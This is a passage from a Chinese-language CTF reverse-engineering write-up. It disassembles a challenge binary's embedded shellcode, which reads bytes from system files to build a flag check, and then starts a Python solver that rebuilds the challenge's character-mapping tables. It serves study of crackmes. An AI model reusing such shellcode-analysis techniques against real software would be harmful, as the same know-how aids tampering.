+<li>python 轉換成 assembly<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===== Part 3: shellcode =====</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> disasm</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x5555555d6430: 0x54    0x5d    0x31    0xf6    0x48    0xb9    0xa1    0x57</span></span><br><span class="line"><span class="string">0x5555555d6438: 0x06    0xb8    0x62    0x3a    0x9f    0x37    0x48    0xba</span></span><br><span class="line"><span class="string">0x5555555d6440: 0x8e    0x35    0x6f    0xd6    0x4d    0x49    0xf7    0x37</span></span><br><span class="line"><span class="string">0x5555555d6448: 0x48    0x31    0xd1    0x51    0x54    0x5f    0x6a    0x02</span></span><br><span class="line"><span class="string">0x5555555d6450: 0x58    0x99    0x0f    0x05    0x48    0x97    0x31    0xc0</span></span><br><span class="line"><span class="string">0x5555555d6458: 0x50    0x54    0x5e    0x6a    0x04    0x5a    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d6460: 0x41    0x5c    0x6a    0x03    0x58    0x0f    0x05    0x31</span></span><br><span class="line"><span class="string">0x5555555d6468: 0xf6    0x48    0xb9    0x3b    0x3b    0x6f    0xc3    0x63</span></span><br><span class="line"><span class="string">0x5555555d6470: 0x64    0xc0    0xaa    0x48    0xba    0x48    0x4c    0x0b</span></span><br><span class="line"><span class="string">0x5555555d6478: 0xc3    0x63    0x64    0xc0    0xaa    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6480: 0x51    0x48    0xb9    0x8c    0x57    0x82    0x75    0xd6</span></span><br><span class="line"><span class="string">0x5555555d6488: 0xf8    0xa9    0x7d    0x48    0xba    0xa3    0x32    0xf6</span></span><br><span class="line"><span class="string">0x5555555d6490: 0x16    0xf9    0x88    0xc8    0x0e    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6498: 0x51    0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f</span></span><br><span class="line"><span class="string">0x5555555d64a0: 0x05    0x48    0x97    0x31    0xc0    0x50    0x54    0x5e</span></span><br><span class="line"><span class="string">0x5555555d64a8: 0x6a    0x04    0x5a    0x0f    0x05    0x41    0x5d    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64b0: 0x03    0x58    0x0f    0x05    0x31    0xf6    0x6a    0x6f</span></span><br><span class="line"><span class="string">0x5555555d64b8: 0x48    0xb9    0x59    0xe5    0x06    0x0c    0x2d    0xf6</span></span><br><span class="line"><span class="string">0x5555555d64c0: 0xd9    0x77    0x48    0xba    0x76    0x81    0x63    0x7a</span></span><br><span class="line"><span class="string">0x5555555d64c8: 0x02    0x8c    0xbc    0x05    0x48    0x31    0xd1    0x51</span></span><br><span class="line"><span class="string">0x5555555d64d0: 0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d64d8: 0x48    0x97    0x31    0xc0    0x50    0x54    0x5e    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64e0: 0x04    0x5a    0x0f    0x05    0x58    0x48    0xf7    0xd0</span></span><br><span class="line"><span class="string">0x5555555d64e8: 0x48    0xc1    0xe8    0x1d    0x48    0x99    0x6a    0x29</span></span><br><span class="line"><span class="string">0x5555555d64f0: 0x59    0x48    0xf7    0xf1    0x49    0x96    0x6a    0x03</span></span><br><span class="line"><span class="string">0x5555555d64f8: 0x58    0x0f    0x05    0xb8    0xef    0xbe    0xad    0xde</span></span><br><span class="line"><span class="string">0x5555555d6500: 0x44    0x01    0xe0    0x44    0x31    0xe8    0xc1    0xc8</span></span><br><span class="line"><span class="string">0x5555555d6508: 0x0b    0xf7    0xd0    0x44    0x31    0xf0    0x3d    0xef</span></span><br><span class="line"><span class="string">0x5555555d6510: 0xbe    0xad    0xde    0x75    0x05    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6518: 0xeb    0x03    0x48    0x31    0xc0    0x50    0x53    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6520: 0x54    0x5e    0x6a    0x08    0x5a    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6528: 0x0f    0x05    0x55    0x5c    0x41    0xff    0xe7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_bytes = parse_memory_dump(shellcode)</span><br><span class="line">disassembled_code = disasm(shellcode_bytes, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(disassembled_code)</span><br></pre></td></tr></table></figure></div></li>
+<li>Result:<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"> 0:   54                      push   rsp</span><br><span class="line"> 1:   5d                      pop    rbp</span><br><span class="line"> 2:   31 f6                   xor    esi, esi</span><br><span class="line"> 4:   48 b9 a1 57 06 b8 62 3a 9f 37   movabs rcx, 0x379f3a62b80657a1</span><br><span class="line"> e:   48 ba 8e 35 6f d6 4d 49 f7 37   movabs rdx, 0x37f7494dd66f358e</span><br><span class="line">18:   48 31 d1                xor    rcx, rdx</span><br><span class="line">1b:   51                      push   rcx</span><br><span class="line">1c:   54                      push   rsp</span><br><span class="line">1d:   5f                      pop    rdi</span><br><span class="line">1e:   6a 02                   push   0x2</span><br><span class="line">20:   58                      pop    rax</span><br><span class="line">21:   99                      cdq</span><br><span class="line">22:   0f 05                   syscall</span><br><span class="line">24:   48 97                   xchg   rdi, rax</span><br><span class="line">26:   31 c0                   xor    eax, eax</span><br><span class="line">28:   50                      push   rax</span><br><span class="line">29:   54                      push   rsp</span><br><span class="line">2a:   5e                      pop    rsi</span><br><span class="line">2b:   6a 04                   push   0x4</span><br><span class="line">2d:   5a                      pop    rdx</span><br><span class="line">2e:   0f 05                   syscall</span><br><span class="line">30:   41 5c                   pop    r12</span><br><span class="line">32:   6a 03                   push   0x3</span><br><span class="line">34:   58                      pop    rax</span><br><span class="line">35:   0f 05                   syscall</span><br><span class="line">37:   31 f6                   xor    esi, esi</span><br><span class="line">39:   48 b9 3b 3b 6f c3 63 64 c0 aa   movabs rcx, 0xaac06463c36f3b3b</span><br><span class="line">43:   48 ba 48 4c 0b c3 63 64 c0 aa   movabs rdx, 0xaac06463c30b4c48</span><br><span class="line">4d:   48 31 d1                xor    rcx, rdx</span><br><span class="line">50:   51                      push   rcx</span><br><span class="line">51:   48 b9 8c 57 82 75 d6 f8 a9 7d   movabs rcx, 0x7da9f8d67582578c</span><br><span class="line">5b:   48 ba a3 32 f6 16 f9 88 c8 0e   movabs rdx, 0xec888f916f632a3</span><br><span class="line">65:   48 31 d1                xor    rcx, rdx</span><br><span class="line">68:   51                      push   rcx</span><br><span class="line">69:   54                      push   rsp</span><br><span class="line">6a:   5f                      pop    rdi</span><br><span class="line">6b:   6a 02                   push   0x2</span><br><span class="line">6d:   58                      pop    rax</span><br><span class="line">6e:   99                      cdq</span><br><span class="line">6f:   0f 05                   syscall</span><br><span class="line">71:   48 97                   xchg   rdi, rax</span><br><span class="line">73:   31 c0                   xor    eax, eax</span><br><span class="line">75:   50                      push   rax</span><br><span class="line">76:   54                      push   rsp</span><br><span class="line">77:   5e                      pop    rsi</span><br><span class="line">78:   6a 04                   push   0x4</span><br><span class="line">7a:   5a                      pop    rdx</span><br><span class="line">7b:   0f 05                   syscall</span><br><span class="line">7d:   41 5d                   pop    r13</span><br><span class="line">7f:   6a 03                   push   0x3</span><br><span class="line">81:   58                      pop    rax</span><br><span class="line">82:   0f 05                   syscall</span><br><span class="line">84:   31 f6                   xor    esi, esi</span><br><span class="line">86:   6a 6f                   push   0x6f</span><br><span class="line">88:   48 b9 59 e5 06 0c 2d f6 d9 77   movabs rcx, 0x77d9f62d0c06e559</span><br><span class="line">92:   48 ba 76 81 63 7a 02 8c bc 05   movabs rdx, 0x5bc8c027a638176</span><br><span class="line">9c:   48 31 d1                xor    rcx, rdx</span><br><span class="line">9f:   51                      push   rcx</span><br><span class="line">a0:   54                      push   rsp</span><br><span class="line">a1:   5f                      pop    rdi</span><br><span class="line">a2:   6a 02                   push   0x2</span><br><span class="line">a4:   58                      pop    rax</span><br><span class="line">a5:   99                      cdq</span><br><span class="line">a6:   0f 05                   syscall</span><br><span class="line">a8:   48 97                   xchg   rdi, rax</span><br><span class="line">aa:   31 c0                   xor    eax, eax</span><br><span class="line">ac:   50                      push   rax</span><br><span class="line">ad:   54                      push   rsp</span><br><span class="line">ae:   5e                      pop    rsi</span><br><span class="line">af:   6a 04                   push   0x4</span><br><span class="line">b1:   5a                      pop    rdx</span><br><span class="line">b2:   0f 05                   syscall</span><br><span class="line">b4:   58                      pop    rax</span><br><span class="line">b5:   48 f7 d0                not    rax</span><br><span class="line">b8:   48 c1 e8 1d             shr    rax, 0x1d</span><br><span class="line">bc:   48 99                   cqo</span><br><span class="line">be:   6a 29                   push   0x29</span><br><span class="line">c0:   59                      pop    rcx</span><br><span class="line">c1:   48 f7 f1                div    rcx</span><br><span class="line">c4:   49 96                   xchg   r14, rax</span><br><span class="line">c6:   6a 03                   push   0x3</span><br><span class="line">c8:   58                      pop    rax</span><br><span class="line">c9:   0f 05                   syscall</span><br><span class="line">cb:   b8 ef be ad de          mov    eax, 0xdeadbeef</span><br><span class="line">d0:   44 01 e0                add    eax, r12d</span><br><span class="line">d3:   44 31 e8                xor    eax, r13d</span><br><span class="line">d6:   c1 c8 0b                ror    eax, 0xb</span><br><span class="line">d9:   f7 d0                   not    eax</span><br><span class="line">db:   44 31 f0                xor    eax, r14d</span><br><span class="line">de:   3d ef be ad de          cmp    eax, 0xdeadbeef</span><br><span class="line">e3:   75 05                   jne    0xea</span><br><span class="line">e5:   6a 01                   push   0x1</span><br><span class="line">e7:   58                      pop    rax</span><br><span class="line">e8:   eb 03                   jmp    0xed</span><br><span class="line">ea:   48 31 c0                xor    rax, rax</span><br><span class="line">ed:   50                      push   rax</span><br><span class="line">ee:   53                      push   rbx</span><br><span class="line">ef:   5f                      pop    rdi</span><br><span class="line">f0:   54                      push   rsp</span><br><span class="line">f1:   5e                      pop    rsi</span><br><span class="line">f2:   6a 08                   push   0x8</span><br><span class="line">f4:   5a                      pop    rdx</span><br><span class="line">f5:   6a 01                   push   0x1</span><br><span class="line">f7:   58                      pop    rax</span><br><span class="line">f8:   0f 05                   syscall</span><br><span class="line">fa:   55                      push   rbp</span><br><span class="line">fb:   5c                      pop    rsp</span><br><span class="line">fc:   41 ff e7                jmp    r15</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<ol start="4">
+<li>分析 shellcode</li>
+</ol>
+<ul>
+<li>0xdeadbeef is not 0xdeadbeef<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cb:   b8 ef be ad de          mov    eax, 0xdeadbeef</span><br><span class="line">de:   3d ef be ad de          cmp    eax, 0xdeadbeef</span><br></pre></td></tr></table></figure></div>
+觀察 shellcode 可以看到總共有兩個地方出現了 0xdeadbeef，但其實從 ida 看後續行為可以發現它其實是把第一個 0xdeadbeef 改成我們處理過後的 input，然後第二個放成一個特定的值。</li>
+<li>主要行為：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 設定 r12</span><br><span class="line"># 設定 r13</span><br><span class="line"># 設定 r14</span><br><span class="line">cb:   b8 ef be ad de          mov    eax, 0xdeadbeef # 放進處理後的輸入 </span><br><span class="line">d0:   44 01 e0                add    eax, r12d       # 和 r12、r13、r14 做一些運算</span><br><span class="line">d3:   44 31 e8                xor    eax, r13d</span><br><span class="line">d6:   c1 c8 0b                ror    eax, 0xb</span><br><span class="line">d9:   f7 d0                   not    eax</span><br><span class="line">db:   44 31 f0                xor    eax, r14d </span><br><span class="line">de:   3d ef be ad de          cmp    eax, 0xdeadbeef # 比較一個特定的值</span><br></pre></td></tr></table></figure></div>
+<p>理解後目標就很明確了，我們只需要找出那三個暫存器的值就可以拿到 flag 了！<br>至於怎麼找值有很多方式，一種是直接靜態分析出來，另外一種是把 shellcode 跑起來動態分析，這邊選擇後者配合剛剛一開始執行的 <code>shellcode.c</code> 和 ida 的 remote linux debugger 來分析，得到值：</p>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r12 = 0x0000000464C457F</span><br><span class="line">r13 = 0x0000000746F6F72</span><br><span class="line">r14 = 0x000000031F3831F</span><br></pre></td></tr></table></figure></div>
+<p>從 ida 取出要比較的常數：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/blade_xmm.png"
+                      alt="xmm"
+                ></p>
+<p>把他轉成 uint32 方便待會的操作：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/blade_uint32_2.png"
+                      alt="uint32"
+                ><br>驗算一下也確實是 64 bytes。</p>
+<h2 id="0x4-Exploits"><a href="#0x4-Exploits" class="headerlink" title="0x4 Exploits"></a>0x4 Exploits</h2><ul>
+<li>generator.py<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===== Part 1: Swap mapping table =====</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Improved Swap Mapping Table</span></span><br><span class="line">original_chars = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">shuffled_chars = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi7D8Jr&#125;espOL4FhwdWAtTGZba5Ugjvnx2QkKE3IS0yuz6BX19m&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generating index mapping using list comprehension for efficiency</span></span><br><span class="line">index_mapping = [shuffled_chars.find(char) <span class="keyword">for</span> char <span class="keyword">in</span> original_chars]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Index Mapping: &quot;</span>, index_mapping)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== Part 2: Bitwise encryption mapping table =====</span></span><br><span class="line"></span><br><span class="line">plain_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x00    0x01    0x02    0x03    0x04    0x05    0x06    0x07</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x08    0x09    0x0a    0x0b    0x0c    0x0d    0x0e    0x0f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x10    0x11    0x12    0x13    0x14    0x15    0x16    0x17</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x18    0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x20    0x21    0x22    0x23    0x24    0x25    0x26    0x27</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x28    0x29    0x2a    0x2b    0x2c    0x2d    0x2e    0x2f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x30    0x31    0x32    0x33    0x34    0x35    0x36    0x37</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x38    0x39    0x3a    0x3b    0x3c    0x3d    0x3e    0x3f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x40    0x41    0x42    0x43    0x44    0x45    0x46    0x47</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x48    0x49    0x4a    0x4b    0x4c    0x4d    0x4e    0x4f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x50    0x51    0x52    0x53    0x54    0x55    0x56    0x57</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x58    0x59    0x5a    0x5b    0x5c    0x5d    0x5e    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x60    0x61    0x62    0x63    0x64    0x65    0x66    0x67</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x68    0x69    0x6a    0x6b    0x6c    0x6d    0x6e    0x6f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x70    0x71    0x72    0x73    0x74    0x75    0x76    0x77</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x78    0x79    0x7a    0x7b    0x7c    0x7d    0x7e    0x7f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x80    0x81    0x82    0x83    0x84    0x85    0x86    0x87</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x88    0x89    0x8a    0x8b    0x8c    0x8d    0x8e    0x8f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x90    0x91    0x92    0x93    0x94    0x95    0x96    0x97</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x98    0x99    0x9a    0x9b    0x9c    0x9d    0x9e    0x9f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xa0    0xa1    0xa2    0xa3    0xa4    0xa5    0xa6    0xa7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xa8    0xa9    0xaa    0xab    0xac    0xad    0xae    0xaf</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xb0    0xb1    0xb2    0xb3    0xb4    0xb5    0xb6    0xb7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xb8    0xb9    0xba    0xbb    0xbc    0xbd    0xbe    0xbf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xc0    0xc1    0xc2    0xc3    0xc4    0xc5    0xc6    0xc7</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xc8    0xc9    0xca    0xcb    0xcc    0xcd    0xce    0xcf</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0xd0    0xd1    0xd2    0xd3    0xd4    0xd5    0xd6    0xd7</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xd8    0xd9    0xda    0xdb    0xdc    0xdd    0xde    0xdf</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xe0    0xe1    0xe2    0xe3    0xe4    0xe5    0xe6    0xe7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xe8    0xe9    0xea    0xeb    0xec    0xed    0xee    0xef</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xf0    0xf1    0xf2    0xf3    0xf4    0xf5    0xf6    0xf7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xf8    0xf9    0xfa    0xfb    0xfc    0xfd    0xfe    0xff</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">encrypted_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfb    0x7b    0x4e    0xbb    0x51    0x15    0x8d    0xdb</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xb0    0xac    0xa5    0x8e    0xaa    0xb2    0x60    0xeb</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x63    0x5c    0xde    0x42    0x2b    0xc6    0xa6    0x35</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x30    0x43    0xd6    0x5f    0xbd    0x24    0xb1    0xe3</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x8c    0xa7    0xd5    0x2a    0x7c    0x6d    0x8b    0x17</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9d    0x83    0xfe    0x69    0x10    0x59    0xa9    0x9e</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x0f    0x1c    0x66    0x97    0x5b    0x61    0xed    0xad</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xe0    0xda    0x27    0x06    0x25    0xdc    0x5e    0xe7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x41    0x32    0xd2    0xd9    0x8f    0xee    0xaf    0x03</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x93    0x3a    0x00    0xa2    0xe1    0xb3    0xec    0x81</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x9f    0xca    0x58    0xb7    0x79    0xfd    0x3b    0xa0</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x02    0x0c    0xcb    0xa8    0x80    0xc0    0x16    0x4d</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x2f    0x75    0x71    0x0a    0x04    0x39    0xff    0xc1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9c    0xab    0xef    0xa4    0xd8    0xe2    0x14    0xc2</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x6c    0x64    0x1e    0x6b    0x7e    0x99    0x2e    0x09</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x0b    0x86    0x74    0x6a    0xc4    0x2d    0x4f    0xf9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfa    0x94    0xb6    0x1f    0x89    0x6f    0x5d    0xe8</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xea    0xb5    0x5a    0x65    0x88    0xc5    0x7f    0x77</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x11    0xcf    0xf1    0x1b    0x3f    0xf4    0x48    0x47</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x12    0xe4    0xba    0xdf    0xe9    0x62    0x6e    0xb4</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x96    0xcd    0x13    0x53    0x4b    0x28    0xd7    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x33    0xb8    0xe6    0x7a    0x2c    0x9b    0x29    0x44</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x52    0xf7    0x20    0xf2    0x31    0xd3    0xb9    0x40</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xd0    0x34    0xf5    0x54    0x1a    0x01    0xa1    0x92</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfc    0x85    0x07    0xbe    0xdd    0xbc    0x19    0xf3</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x36    0xf6    0x72    0x98    0x4c    0x7d    0xc7    0xd4</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x45    0x4a    0x9a    0xc3    0x8a    0xe5    0x50    0x46</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xcc    0x68    0x76    0x67    0xc9    0x0e    0x3c    0x57</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xf0    